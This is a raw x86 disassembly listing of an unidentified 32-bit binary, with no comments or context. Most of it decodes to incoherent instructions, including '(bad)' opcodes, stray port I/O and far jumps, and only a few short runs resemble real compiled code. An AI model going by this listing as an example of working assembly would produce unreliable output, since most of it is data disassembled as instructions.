  407b06:	test   ebp,ebx
  407b08:	adc    DWORD PTR [edi],ebp
  407b0a:	jnp    0x407af5
  407b0c:	mov    ds:0xe5591a88,eax
  407b11:	and    eax,0x33c6fff8
  407b16:	mov    BYTE PTR [ebx],0xc7
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	arpl   WORD PTR [esi],cx
  407b41:	pushf  
  407b42:	test   BYTE PTR [edi-0x37],dl
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b7b
  407b4c:	dec    ebx
  407b4d:	shl    BYTE PTR [ecx],cl
  407b4f:	(bad)  
  407b50:	xabort 0xcf
  407b53:	outs   dx,BYTE PTR ds:[esi]
  407b54:	sub    BYTE PTR [ecx-0x42],0xce
  407b58:	repz mov ch,0xa
  407b5b:	and    ecx,0xcd96f5bf
  407b61:	stos   BYTE PTR es:[edi],al
  407b62:	mov    dh,0x8f
  407b64:	sbb    dl,BYTE PTR [ecx-0x3e2356a7]
  407b6a:	or     esi,0xfffffff9
  407b6d:	pop    ds
  407b6e:	outs   dx,BYTE PTR ds:[esi]
  407b6f:	mov    fs,esi
  407b71:	mov    bh,0x55
  407b73:	popa   
  407b74:	ror    DWORD PTR [eax],cl
  407b76:	inc    eax
  407b77:	fs (bad) 
  407b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b7a:	pop    edx
  407b7b:	loopne 0x407bc8
  407b7d:	fld    QWORD PTR [edx+0x3e]
  407b80:	fiadd  DWORD PTR [eax]
  407b82:	loope  0x407b69
  407b84:	xchg   ebx,eax
  407b85:	loope  0x407ba2
  407b87:	mov    BYTE PTR [ebx+0x6926ec75],cl
  407b8d:	jg     0x407b72
  407b8f:	pop    ecx
  407b90:	pop    esi
  407b91:	les    esi,FWORD PTR ds:0x5ebcd006
  407b97:	cs (bad) 
  407b99:	xor    esi,ebx
  407b9b:	xchg   ebx,eax
  407b9c:	xchg   edx,eax
  407b9d:	mov    ds:0xd34646fc,eax
  407ba2:	adc    ah,ah
  407ba4:	or     eax,0xb04f8ad
  407ba9:	xor    eax,0xf16d7989
  407bae:	shl    BYTE PTR [ecx-0x460dd59a],1
  407bb4:	fwait
  407bb5:	(bad)  
  407bb6:	test   edx,esi
  407bb8:	iret   
  407bb9:	jg     0x407be1
  407bbb:	popf   
  407bbc:	xchg   DWORD PTR [ebx+0x2e],esi
  407bbf:	jnp    0x407c0f
  407bc1:	test   ecx,ebp
  407bc3:	jmp    0x407b69
  407bc5:	jne    0x407be3
  407bc7:	mov    eax,ds:0xc6df5d89
  407bcc:	outs   dx,BYTE PTR ds:[esi]
  407bcd:	dec    esp
  407bce:	xchg   esp,eax
  407bcf:	cmp    eax,0x975482df
  407bd4:	push   ss
  407bd5:	sub    al,0xa7
  407bd7:	jl     0x407b5a
  407bd9:	push   esp
  407bda:	pop    es
  407bdb:	fxam   
  407bdd:	cmp    DWORD PTR [ebx+0x24],ebx
  407be0:	dec    ebx
  407be1:	stc    
  407be2:	out    0x67,al
  407be4:	fwait
  407be5:	adc    DWORD PTR [eax+0x1c],eax
  407be8:	dec    eax
  407be9:	les    ebp,FWORD PTR [eax+eiz*2-0x75]
  407bed:	mov    dh,0x7a
  407bef:	pop    edx
  407bf0:	xchg   esi,eax
  407bf1:	in     al,0xa6
  407bf3:	sti    
  407bf4:	mov    cl,0x7e
  407bf6:	or     dl,BYTE PTR [ecx+edx*8-0x60]
  407bfa:	fist   DWORD PTR [eax-0x32]
  407bfe:	outs   dx,DWORD PTR ds:[esi]
  407bff:	pop    ebx
  407c00:	jb     0x407c1d
  407c02:	adc    eax,0xce8a4ab1
  407c07:	cmp    al,0xf7
  407c09:	outs   dx,DWORD PTR ds:[esi]
  407c0a:	xor    eax,0xb15b2345
  407c0f:	adc    dh,bl
  407c11:	std    
  407c12:	(bad)  
  407c13:	add    al,0x8c
  407c15:	call   0x9917cfd3
  407c1a:	mov    al,0x90
  407c1c:	fistp  WORD PTR [esi+0x1d]
  407c1f:	pop    ss
  407c20:	mov    ch,0xeb
  407c22:	dec    edi
  407c23:	adc    DWORD PTR [ebx-0x88679a],ecx
  407c29:	xchg   esi,eax
  407c2a:	dec    ecx
  407c2b:	pop    ebx
  407c2c:	(bad)  
  407c2d:	mov    eax,0x9a551569
  407c32:	sti    
  407c33:	or     BYTE PTR [eax-0x122fa217],0x2f
  407c3a:	mov    edi,0x772d06fa
  407c3f:	nop
  407c40:	shl    ecx,1
  407c42:	mov    eax,0xa9eaf4c9
  407c47:	push   eax
  407c48:	xchg   edi,eax
  407c49:	push   ebp
  407c4a:	mov    edi,0x93f9aac1
  407c4f:	xchg   esp,eax
  407c50:	mov    esp,0xebaa1150
  407c55:	adc    ebx,DWORD PTR [ecx-0x3a61b656]
  407c5b:	and    eax,0xc9f670ad
  407c60:	cmp    ah,BYTE PTR [eax+edi*1-0x3f200db]
  407c67:	add    DWORD PTR [ecx+0x1d126187],ebp
  407c6d:	scas   eax,DWORD PTR es:[edi]
  407c6e:	js     0x407ce8
  407c70:	icebp  
  407c71:	and    al,0xcf
  407c73:	dec    eax
  407c74:	bound  esp,QWORD PTR [esi-0x39]
  407c77:	sahf   
  407c78:	lods   al,BYTE PTR ds:[esi]
  407c79:	sub    BYTE PTR [ebx+0x679f77e6],ah
  407c7f:	pop    esp
  407c80:	icebp  
  407c81:	or     DWORD PTR [eax-0x7567d6a5],0x3f
  407c88:	cmp    al,0x9c
  407c8a:	ds mov cl,BYTE PTR es:[esi]
  407c8e:	mov    al,0xde
  407c90:	lods   al,BYTE PTR ds:[esi]
  407c91:	cmp    DWORD PTR [ebx-0x5a],0x34
  407c95:	jae    0x407c6a
  407c97:	mov    DWORD PTR [esi+0x6f],edx
  407c9a:	fwait
  407c9b:	pushf  
  407c9c:	pop    edi
  407c9d:	jmp    0xcc09:0xe8be0217
  407ca4:	arpl   ax,cx
  407ca6:	adc    DWORD PTR [edi-0x6b],edx
  407ca9:	fnstcw WORD PTR [ebx+0x708d4509]
  407caf:	ret    
  407cb0:	push   esi
  407cb1:	or     edi,DWORD PTR ds:0x640d7980
  407cb7:	hlt    
  407cb8:	jae    0x407cb9
  407cba:	sbb    ah,0x3e
  407cbd:	out    0x5a,eax
  407cbf:	rol    DWORD PTR [eax-0xf],cl
  407cc2:	mov    dh,0x37
  407cc4:	jnp    0x407c95
  407cc6:	inc    esi
  407cc7:	push   0xffffff81
  407cc9:	xor    edx,eax
  407ccb:	mov    ebp,0x63a26077
  407cd0:	outs   dx,BYTE PTR ds:[esi]
  407cd1:	dec    edi
  407cd2:	nop
  407cd3:	jg     0x407caf
  407cd5:	es or  al,0xc3
  407cd8:	cmp    eax,0x98616a2
  407cdd:	fdiv   DWORD PTR [eax+0x38a74d6d]
  407ce3:	out    dx,eax
  407ce4:	jbe    0x407cf5
  407ce6:	inc    edi
  407ce7:	sub    cl,BYTE PTR [edi]
  407ce9:	push   esi
  407cea:	push   ebx
  407ceb:	(bad)  
  407cec:	xchg   BYTE PTR [ebx-0x5],bl
  407cef:	scas   eax,DWORD PTR es:[edi]
  407cf0:	push   cs
  407cf1:	inc    ecx
  407cf2:	jle    0x407d10
  407cf4:	fiadd  DWORD PTR [ecx]
  407cf6:	das    
  407cf7:	mov    ebp,DWORD PTR [ebx-0x3e]
  407cfa:	test   DWORD PTR [ebx+esi*8],eax
  407cfd:	add    esi,eax
  407cff:	scas   eax,DWORD PTR es:[edi]
  407d00:	xchg   edi,eax
  407d01:	jl     0x407d6a
  407d03:	push   esi
  407d04:	sub    al,ah
  407d06:	dec    DWORD PTR fs:[eax+0x4e]
  407d0a:	mov    ds:0x1b71b7fd,al
  407d0f:	push   edx
  407d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d11:	popa   
  407d12:	addr16 and al,0x69
  407d15:	sub    BYTE PTR [eax-0x3a1073da],ah
  407d1b:	mov    dh,0x72
  407d1d:	iret   
  407d1e:	mov    edi,0x1fecc3b
  407d23:	sub    ecx,DWORD PTR [edx+0x78728b41]
  407d29:	dec    ebx
  407d2a:	pusha  
  407d2b:	push   esp
  407d2c:	fcomp  st(4)
  407d2e:	mov    BYTE PTR [eax+0x7f],ch
  407d31:	mov    cl,0xd0
  407d33:	sbb    al,0xcc
  407d35:	mov    ch,0x9
  407d37:	imul   BYTE PTR [edi-0x231a1192]
  407d3d:	fiadd  WORD PTR [esi]
  407d3f:	int3   
  407d40:	add    DWORD PTR [ecx+0x79ecb43c],edx
  407d46:	or     eax,0x1218f189
  407d4b:	xchg   DWORD PTR [eax-0x7415ee59],ebp
  407d51:	adc    DWORD PTR [ebx+ecx*8],edi
  407d54:	enter  0xfaa6,0xea
  407d58:	push   ecx
  407d59:	fild   DWORD PTR [eax]
  407d5b:	daa    
  407d5c:	and    BYTE PTR [eax-0x64],bl
  407d5f:	stos   DWORD PTR es:[edi],eax
  407d60:	push   esp
  407d61:	inc    esp
  407d62:	mov    dh,0xff
  407d64:	or     bh,BYTE PTR [ecx+ebx*8]
  407d67:	rol    BYTE PTR [edx+0x10],1
  407d6a:	inc    esi
  407d6b:	pop    esi
  407d6c:	push   ecx
  407d6d:	sub    dl,dh
  407d6f:	xor    al,0xb
  407d71:	cmp    eax,0xe9903339
  407d76:	lock jp 0x407dc0
  407d79:	shl    BYTE PTR [ebx-0x3e],1
  407d7c:	pop    ecx
  407d7d:	into   
  407d7e:	mov    BYTE PTR [eax-0x3be3da7d],ch
  407d84:	nop
  407d85:	mul    cl
  407d87:	mov    bl,0x11
  407d89:	std    
  407d8a:	push   esi
  407d8b:	outs   dx,DWORD PTR ds:[esi]
  407d8c:	jmp    0xfd37ca26
  407d91:	pusha  
  407d92:	(bad)  
  407d94:	add    al,0x5
  407d96:	xchg   edx,eax
  407d97:	inc    ebp
  407d98:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407d9a:	loope  0x407dc8
  407d9c:	sub    al,BYTE PTR [esi-0x5d609b20]
  407da2:	arpl   WORD PTR [edi-0x75],di
  407da5:	xchg   edi,eax
  407da6:	adc    al,BYTE PTR [ebp-0xcf9b96f]
  407dac:	retf   0x8de3
  407daf:	in     eax,dx
  407db0:	out    dx,al
  407db1:	mov    edi,ss
  407db3:	add    esp,DWORD PTR [edi+edi*8]
  407db6:	xchg   ebp,eax
  407db7:	adc    eax,0x163f20dc
  407dbc:	mov    edx,0xb1b33146
  407dc1:	cmp    cl,BYTE PTR cs:[ebp-0x1a33ed7b]
  407dc8:	mov    edx,ebp
  407dca:	mov    ebx,0xee101d41
  407dcf:	dec    eax
  407dd0:	pop    eax
  407dd1:	or     bl,BYTE PTR [edx+ebp*8-0x490d67dc]
  407dd8:	inc    esi
  407dd9:	mov    DWORD PTR [edx+edx*2],edx
  407ddc:	mov    ds:0xf7ddc7e8,eax
  407de1:	mov    ch,BYTE PTR [esi-0x7b]
  407de4:	dec    eax
  407de5:	mov    cl,0x1f
  407de7:	ja     0x407da9
  407de9:	in     al,0x5a
  407deb:	sub    eax,0x78994ea8
  407df0:	pop    edx
  407df1:	pop    esi
  407df2:	pop    edi
  407df3:	popf   
  407df4:	dec    ebx
  407df5:	sbb    ebx,DWORD PTR [esi+0x16]
  407df8:	(bad)  
  407df9:	jmp    0x407dd6
  407dfb:	ds mov dl,0x6f
  407dfe:	stos   BYTE PTR es:[edi],al
  407dff:	gs cmc 
  407e01:	scas   al,BYTE PTR es:[edi]
  407e02:	jbe    0x407e13
  407e04:	or     eax,0x414d9f67
  407e09:	loopne 0x407e7a
  407e0b:	cmc    
  407e0c:	or     al,0xe6
  407e0e:	(bad)  
  407e0f:	sar    DWORD PTR [eax],cl
  407e11:	sti    
  407e12:	rcl    DWORD PTR [esi],1
  407e14:	push   eax
  407e15:	cdq    
  407e16:	and    DWORD PTR [edx+0x63],ebx
  407e19:	loope  0x407dac
  407e1b:	push   ebp
  407e1c:	mov    bl,0x8c
  407e1e:	pop    ebp
  407e1f:	sar    BYTE PTR [ebx],cl
  407e21:	jp     0x407dc5
  407e23:	add    eax,0x97818d07
  407e28:	sub    BYTE PTR [ebp-0x59d43fdd],dh
  407e2e:	data16 xlat BYTE PTR ds:[ebx]
  407e30:	std    
  407e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e32:	ja     0x407e38
  407e34:	in     al,dx
  407e35:	imul   DWORD PTR [edx-0x6c54e106]
  407e3b:	xor    DWORD PTR [edi],esi
  407e3d:	test   al,0xc5
  407e3f:	in     eax,0xff
  407e41:	aas    
  407e42:	xchg   esp,eax
  407e43:	mov    ds:0xa9d4d048,al
  407e48:	ret    
  407e49:	pop    DWORD PTR [esp+ebx*4-0x64664fab]
  407e50:	dec    ecx
  407e51:	div    DWORD PTR [eax-0x76]
  407e54:	(bad)  
  407e56:	popf   
  407e57:	or     ecx,eax
  407e59:	jge    0x407e5b
  407e5b:	jmp    0xafc6:0x78e300ca
  407e62:	cli    
  407e63:	add    DWORD PTR [ebp+0x2fddf48],esp
  407e69:	lock fisttp QWORD PTR [ecx-0x4f]
  407e6d:	jmp    0xb9d15d14
  407e72:	push   0x42
  407e74:	pop    edi
  407e75:	idiv   esi
  407e77:	loop   0x407ee9
  407e79:	cwde   
  407e7a:	inc    esp
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	int3   
  407e99:	loopne 0x407e54
  407e9b:	jmp    0x407ea4
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407eee
  407ea5:	jmp    0x407e83
  407ea7:	cli    
  407ea8:	dec    ecx
  407ea9:	mov    ds:0x195904ae,al
  407eae:	add    eax,0x993a59ef
  407eb3:	jb     0x407f21
  407eb5:	add    eax,0x72dfd393
  407eba:	out    dx,eax
  407ebb:	lods   eax,DWORD PTR ds:[esi]
  407ebc:	in     eax,dx
  407ebd:	sbb    al,0x94
  407ebf:	adc    DWORD PTR [ebx-0x52528fc1],0x1b
  407ec6:	dec    esi
  407ec7:	mov    bl,0x2a
  407ec9:	icebp  
  407eca:	repz add DWORD PTR [esi],ebx
  407ecd:	stos   DWORD PTR es:[edi],eax
  407ece:	push   ss
  407ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed0:	jae    0x407e58
  407ed2:	rcpps  xmm6,XMMWORD PTR [edx-0x5d94e25c]
  407ed9:	inc    esi
  407eda:	push   edx
  407edb:	jns    0x407e9b
  407edd:	xchg   esi,eax
  407ede:	jae    0x407f2c
  407ee0:	ret    
  407ee1:	outs   dx,DWORD PTR ds:[esi]
  407ee2:	xor    ch,BYTE PTR [edi-0x5d]
  407ee5:	lods   eax,DWORD PTR ds:[esi]
  407ee6:	dec    edi
  407ee7:	ja     0x407f53
  407ee9:	mov    ?,ecx
  407eeb:	(bad)  
  407eec:	jnp    0x407eaa
  407eee:	mov    ebp,0x7209593e
  407ef3:	pusha  
  407ef4:	mov    ch,0x7c
  407ef6:	push   esp
  407ef7:	sub    bl,BYTE PTR [edx+eax*8-0x64]
  407efb:	in     al,dx
  407efc:	jae    0x407eb0
  407efe:	pop    edi
  407eff:	or     dl,0x3f
  407f02:	repnz ins BYTE PTR es:[edi],dx
  407f04:	and    al,0xfb
  407f06:	mov    al,ds:0x6871859c
  407f0b:	cmp    BYTE PTR [eax-0x4e86b522],cl
  407f11:	mov    WORD PTR [ebp-0x71d72fd7],ds
  407f17:	xchg   DWORD PTR [edi-0x8201f66],ecx
  407f1d:	push   0xe9d4c322
  407f22:	push   edi
  407f23:	out    0xde,al
  407f25:	jl     0x407f58
  407f27:	hlt    
  407f28:	dec    esi
  407f29:	mov    al,ds:0xeba74ffe
  407f2e:	mov    esi,0x9ea0c5af
  407f33:	mov    ?,WORD PTR [ebx]
  407f35:	in     eax,dx
  407f36:	push   es
  407f37:	(bad)  
  407f38:	mov    WORD PTR [ebp-0x67284170],?
  407f3e:	outs   dx,DWORD PTR ds:[esi]
  407f40:	push   cs
  407f41:	fstp   QWORD PTR [edi-0x260458fa]
  407f47:	inc    eax
  407f48:	and    eax,DWORD PTR [ecx+0x34]
  407f4b:	loop   0x407f9d
  407f4d:	ficomp WORD PTR [ecx-0x25]
  407f50:	sbb    ah,BYTE PTR [di+0x135c]
  407f55:	and    BYTE PTR [esi-0x1f],dh
  407f58:	adc    ecx,edx
  407f5a:	scas   eax,DWORD PTR es:[edi]
  407f5b:	test   al,0x68
  407f5d:	or     BYTE PTR [ecx],bl
  407f5f:	cdq    
  407f60:	mov    al,gs:0x979981a0
  407f66:	imul   ebx,ebp,0xffffff83
  407f69:	sub    BYTE PTR [ecx-0x65b7a1f1],bh
  407f6f:	outs   dx,DWORD PTR ds:[esi]
  407f70:	data16 jg 0x407f92
  407f73:	(bad)  
  407f74:	iret   
  407f75:	sbb    eax,DWORD PTR fs:[ebx]
  407f78:	add    ebp,eax
  407f7a:	in     al,dx
  407f7b:	add    BYTE PTR ds:0x3bfb28c8,cl
  407f81:	dec    edx
  407f82:	(bad)  
  407f83:	sbb    esp,DWORD PTR [ebx+esi*1-0x6c]
  407f87:	jmp    0xec1b:0x1d1d3d76
  407f8e:	push   0xef2e4a71
  407f93:	dec    eax
  407f94:	inc    ebp
  407f95:	movzx  edx,WORD PTR [ebx+eiz*2]
  407f99:	daa    
  407f9a:	lds    esi,FWORD PTR [esi+0x41]
  407f9d:	xchg   ebx,eax
  407f9e:	dec    esi
  407f9f:	push   ss
  407fa0:	inc    edx
  407fa1:	cs retf 0x8234
  407fa5:	(bad)  
  407fa6:	loopne 0x407fbf
  407fa8:	leave  
  407fa9:	sub    bh,bh
  407fab:	pusha  
  407fac:	in     al,0x40
  407fae:	or     BYTE PTR [ebx+eiz*1+0x10],bl
  407fb2:	cmp    eax,edi
  407fb4:	loop   0x407fa2
  407fb6:	aad    0x93
  407fb8:	std    
  407fb9:	sar    BYTE PTR [ecx-0x2efa99a7],1
  407fbf:	(bad)  
  407fc1:	mov    eax,0xb6c48fb9
  407fc6:	push   ds
  407fc7:	nop
  407fc8:	out    0xfa,eax
  407fca:	jae    0x407f9d
  407fcc:	(bad)  
  407fcd:	jg     0x407fd0
  407fcf:	daa    
  407fd0:	cld    
  407fd1:	push   ss
  407fd2:	sbb    DWORD PTR [ebx],ecx
  407fd4:	shr    DWORD PTR [eax+0x18],cl
  407fd7:	inc    ebx
  407fd8:	dec    esp
  407fd9:	lods   eax,DWORD PTR ds:[esi]
  407fda:	xchg   BYTE PTR [esi-0x20],cl
  407fdd:	call   0xaec0:0x7e9a5908
  407fe4:	push   ecx
  407fe5:	fidivr DWORD PTR [edi]
  407fe7:	js     0x407ff3
  407fe9:	daa    
  407fea:	jmp    0x4435:0x1cb913fc
  407ff1:	add    dh,BYTE PTR [edx]
  407ff3:	or     eax,0x652c547c
  407ff8:	idiv   BYTE PTR [eax-0x65]
  407ffb:	cmc    
  407ffc:	in     eax,0x92
  407ffe:	cs add eax,0x74a106fd
  408004:	leave  
  408005:	mov    BYTE PTR [ebx+0x3e],al
  408008:	adc    bl,BYTE PTR [esi+0x50]
  40800b:	push   cs
  40800c:	xor    DWORD PTR [ebp+eax*1+0x20ab8d20],0xaadae7ec
  408017:	xchg   edx,eax
  408018:	pop    ds
  408019:	sub    al,0xa0
  40801b:	mov    ebx,0xb7d4d8c5
  408020:	jle    0x40804f
  408022:	push   0xffffffb9
  408024:	call   0x7d537ed1
  408029:	fild   QWORD PTR [ebx]
  40802b:	xchg   BYTE PTR [esi],dh
  40802d:	outs   dx,DWORD PTR ds:[esi]
  40802e:	jecxz  0x407fd4
  408030:	adc    esp,DWORD PTR [edi+ecx*4-0x20]
  408034:	div    ebx
  408036:	inc    esp
  408037:	adc    BYTE PTR [ebp-0x18],dl
  40803a:	or     eax,0xef93c0ca
  40803f:	and    eax,0x60f962b4
  408044:	sub    esp,0x2a
  408047:	push   eax
  408048:	loopne 0x407ffa
  40804a:	in     eax,dx
  40804b:	jno    0x408079
  40804d:	jb     0x408088
  40804f:	push   esp
  408050:	mov    dh,0x20
  408052:	sub    BYTE PTR [ebx-0x11],0xc5
  408056:	ins    DWORD PTR es:[edi],dx
  408057:	dec    ebp
  408058:	xor    edx,DWORD PTR [esi-0x69]
  40805b:	into   
  40805c:	mov    edx,0x8cfd011e
  408061:	pop    esp
  408062:	pop    esp
  408063:	lahf   
  408064:	push   esp
  408065:	xor    edi,esp
  408067:	imul   DWORD PTR [edx+0x4a]
  40806a:	and    BYTE PTR [esi-0xa],ah
  40806d:	mov    eax,ds:0x9499c92e
  408072:	int3   
  408073:	les    esp,FWORD PTR [ebx+0x57]
  408076:	ds out dx,al
  408078:	push   edx
  408079:	setae  BYTE PTR [eax+0x5c]
  40807d:	add    al,0x4e
  40807f:	popf   
  408080:	mov    eax,0xeec9c66
  408085:	jae    0x40806b
  408087:	jmp    0x40805e
  408089:	xchg   DWORD PTR [edx],ecx
  40808b:	fdiv   DWORD PTR [esi+0x20593127]
  408091:	mov    eax,ds:0xe8858257
  408096:	push   ebp
  408097:	pop    ecx
  408098:	mov    WORD PTR [edi],ss
  40809a:	inc    esp
  40809b:	mov    dh,0xc2
  40809d:	out    0x1b,eax
  40809f:	pop    ebx
  4080a0:	pop    ss
  4080a1:	jmp    0xfed2:0x1c2a4eb3
  4080a8:	add    BYTE PTR [ebp+edx*1-0x736d1a3d],al
  4080af:	or     al,0x9
  4080b1:	(bad)  
  4080b2:	in     al,dx
  4080b3:	repz dec ebx
  4080b5:	fidivr DWORD PTR [ecx+ebx*2-0x48ee8c6]
  4080bc:	call   0xe3b04276
  4080c1:	(bad)  
  4080c2:	jp     0x40812b
  4080c4:	ret    0x9eb5
  4080c7:	add    eax,0x57f658d6
  4080cc:	ins    DWORD PTR es:[edi],dx
  4080cd:	sub    al,0xc5
  4080cf:	adc    eax,0x402c2e6b
  4080d4:	or     eax,0x4f38a368
  4080d9:	xor    al,0xf4
  4080db:	arpl   dx,si
  4080dd:	mov    ah,0x8a
  4080df:	jmp    0xef631864
  4080e4:	push   0x4c409f05
  4080e9:	retf   
  4080ea:	xor    ch,dl
  4080ec:	mov    ebx,ss
  4080ee:	mov    dl,0xad
  4080f0:	push   esp
  4080f1:	jnp    0x40809b
  4080f3:	mov    eax,ds:0x9bcb46cc
  4080f8:	inc    ecx
  4080f9:	(bad)  
  4080fa:	xchg   ebp,eax
  4080fb:	mov    ecx,0x75aea4bd
  408100:	std    
  408101:	mov    eax,ds:0x70458df1
  408106:	ds jg  0x4080b9
  408109:	popa   
  40810a:	rcl    DWORD PTR [edi],0x3b
  40810d:	js     0x408175
  40810f:	daa    
  408110:	(bad)  
  408111:	sahf   
  408112:	std    
  408113:	loopne 0x4080bf
  408115:	lea    edi,[edx-0x5f3b47d9]
  40811b:	xchg   edx,eax
  40811c:	mov    fs,WORD PTR [eax]
  40811e:	gs enter 0xf9be,0x78
  408123:	pop    ecx
  408124:	xchg   esp,eax
  408125:	sbb    bl,al
  408127:	mov    ds:0x52bdb19a,eax
  40812c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40812d:	mov    esp,0x35e504f1
  408132:	inc    ebp
  408133:	inc    edx
  408134:	jns    0x40817f
  408136:	and    esi,ebp
  408138:	cs inc ebx
  40813a:	push   edi
  40813b:	ret    0x4ba6
  40813e:	mov    ecx,0x437a2c02
  408143:	ins    BYTE PTR es:[edi],dx
  408144:	or     eax,0x8322e27c
  408149:	retf   0xc955
  40814c:	add    dl,ah
  40814e:	dec    ecx
  40814f:	inc    esp
  408150:	outs   dx,BYTE PTR ds:[esi]
  408151:	mov    al,ds:0x1520033a
  408156:	(bad)
  408159:	adc    eax,0xbf482366
  40815e:	sar    BYTE PTR [edi+0x19],0xe4
  408162:	retf   
  408163:	aam    0xcb
  408165:	sub    eax,0x48ebe8d9
  40816a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40816b:	dec    eax
  40816c:	enter  0xa5e8,0xa1
  408170:	jmp    0x4081b2
  408172:	add    al,0xfb
  408174:	mov    ecx,0xf411ce5b
  408179:	aam    0xc8
  40817b:	int3   
  40817c:	mov    ds:0x468e69fe,al
  408181:	cli    
  408182:	mov    edx,0xa71f4b04
  408187:	sub    cl,dl
  408189:	pop    ss
  40818a:	pushf  
  40818b:	test   al,0x3c
  40818d:	sbb    bl,BYTE PTR [edi]
  40818f:	mov    ds:0x6bf1fd6c,eax
  408194:	in     eax,0xeb
  408196:	sbb    DWORD PTR [ebx+0x7],0x7e
  40819a:	stc    
  40819b:	sbb    ecx,ebx
  40819d:	xchg   esi,eax
  40819e:	or     BYTE PTR [edi-0x43b1b738],0xfb
  4081a5:	cmp    al,0x48
  4081a7:	je     0x40819b
  4081a9:	ins    BYTE PTR es:[edi],dx
  4081aa:	mov    eax,ds:0x917fb9b
  4081af:	fstp   TBYTE PTR [edi]
  4081b1:	fs add ah,cl
  4081b4:	lock cwde 
  4081b6:	lods   eax,DWORD PTR ds:[esi]
  4081b7:	sub    dl,BYTE PTR [ebx]
  4081b9:	cmp    eax,0x39eba69d
  4081be:	cmp    edx,ecx
  4081c0:	fmulp  st(1),st
  4081c2:	cmc    
  4081c3:	or     al,0x26
  4081c5:	xor    dl,BYTE PTR [edi-0x438cb027]
  4081cb:	int    0x71
  4081cd:	mov    ah,0x84
  4081cf:	mov    ebx,0x37325e46
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mov    ebp,0x37eb5af1
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40824b
  408275:	cmp    DWORD PTR [edx+0x16],edi
  408278:	xchg   edx,eax
  408279:	jge    0x40820f
  40827b:	outs   dx,DWORD PTR ds:[esi]
  40827c:	fwait
  40827d:	std    
  40827e:	mov    edx,0xde96eb40
  408283:	fsubr  st(6),st
  408285:	int    0x2f
  408287:	mov    dl,0xec
  408289:	mov    BYTE PTR [ecx-0x2d606831],ah
  40828f:	les    ebp,FWORD PTR [ebp+0x2a]
  408292:	mov    ch,0xeb
  408294:	(bad)  
  408295:	mov    ah,0xb4
  408297:	mov    BYTE PTR gs:[edx+0x64bb2407],cl
  40829e:	pop    ds
  40829f:	jge    0x4082f0
  4082a1:	jae    0x408239
  4082a3:	sbb    al,0xa2
  4082a5:	mov    eax,0x8730d214
  4082aa:	inc    ecx
  4082ab:	lea    ebx,[edi]
  4082ad:	inc    edx
  4082ae:	aaa    
  4082af:	or     DWORD PTR [edx-0x64],ecx
  4082b2:	cmc    
  4082b3:	cmp    BYTE PTR [edi+edx*4+0x2b],dl
  4082b7:	dec    esp
  4082b8:	push   esi
  4082b9:	and    esp,DWORD PTR [ebx]
  4082bb:	ins    DWORD PTR es:[edi],dx
  4082bc:	shl    esi,0xab
  4082bf:	repz xchg ebx,eax
